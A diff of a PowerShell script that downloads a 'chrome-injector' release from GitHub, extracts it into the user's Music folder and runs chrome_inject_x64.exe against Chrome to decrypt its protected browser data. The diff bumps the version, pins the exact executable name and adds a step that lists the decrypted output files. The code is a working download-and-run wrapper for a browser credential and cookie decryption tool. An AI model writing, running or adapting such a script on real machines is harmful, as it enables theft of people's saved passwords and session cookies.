@@ -17,7 +17,7 @@ $ErrorActionPreference = "Stop"
 $ProgressPreference = if ($Quiet) { "SilentlyContinue" } else { "Continue" }
 
 # Constants
-$URL = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.14.0/chrome-injector-v0.14.0.zip"
+$URL = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.14.2/chrome-injector-v0.14.2.zip"
 $EXTRACT_PATH = "$env:USERPROFILE\Music\chrome_decryptor"
 $ZIP_PATH = "$env:TEMP\chrome_decryptor_$(Get-Random).zip"
 # This will be updated after extraction based on actual files
@@ -83,20 +83,20 @@ try {
             Write-Host "No files found in extraction directory!" -ForegroundColor Red
         }
 
-        # Find the injector executable
+        # Find the specific chrome_inject_x64.exe executable
         $allFiles = Get-ChildItem -Path $EXTRACT_PATH -Recurse -File
-        $injectorFile = $allFiles | Where-Object { $_.Name -like "*inject*.exe" } | Select-Object -First 1
+        $injectorFile = $allFiles | Where-Object { $_.Name -eq "chrome_inject_x64.exe" } | Select-Object -First 1
 
         if ($injectorFile) {
             $script:INJECTOR_EXE = $injectorFile.FullName
-            Write-Status "Found injector: $($injectorFile.Name)"
+            Write-Status "Found chrome_inject_x64.exe: $($injectorFile.FullName)"
         }
 
-        # Verify extraction - we only need the injector
+        # Verify extraction - we specifically need chrome_inject_x64.exe
         if (-not $injectorFile) {
             Write-Host "Available files:" -ForegroundColor Yellow
             $allFiles | ForEach-Object { Write-Host "  $($_.Name)" -ForegroundColor Gray }
-            throw "Extraction failed - chrome injector executable not found."
+            throw "Extraction failed - chrome_inject_x64.exe not found."
         }
 
         Write-Status "Extraction completed"
@@ -104,8 +104,37 @@ try {
 
     Write-Status "Running Chrome injector..."
 
-    # Run injector with chrome argument
-    $injectorProcess = Start-Process -FilePath $INJECTOR_EXE -ArgumentList "chrome" -PassThru
+    # Change to extracted directory so injector can find encryptor.exe
+    $originalLocation = Get-Location
+    Set-Location -Path $EXTRACT_PATH
+    
+    try {
+        # Run injector with chrome argument from the extracted directory
+        Write-Host "Executing: ./chrome_inject_x64.exe chrome" -ForegroundColor Cyan
+        Write-Host "Please wait for the decryption process to complete..." -ForegroundColor Yellow
+
+        # Use cmd.exe to run the executable for better console interaction
+        & cmd.exe /c "chrome_inject_x64.exe chrome"
+        
+        # Check if output directory was created
+        $outputPath = Join-Path $EXTRACT_PATH "output"
+        if (Test-Path $outputPath) {
+            Write-Host "`n[SUCCESS] Decryption completed! Output saved to: $outputPath" -ForegroundColor Green
+            
+            # Show what was extracted
+            $outputFiles = Get-ChildItem -Path $outputPath -Recurse -File
+            if ($outputFiles) {
+                Write-Host "Extracted files:" -ForegroundColor Cyan
+                $outputFiles | ForEach-Object { Write-Host "  $($_.FullName)" -ForegroundColor Gray }
+            }
+        } else {
+             Write-Host "`n[INFO] Decryption process finished. No output directory was created." -ForegroundColor Yellow
+        }
+        
+    } finally {
+        # Return to original directory
+        Set-Location -Path $originalLocation
+    }
 
     Write-Status "Tools launched successfully"
     Write-Host "`nTools location: $EXTRACT_PATH" -ForegroundColor Cyan
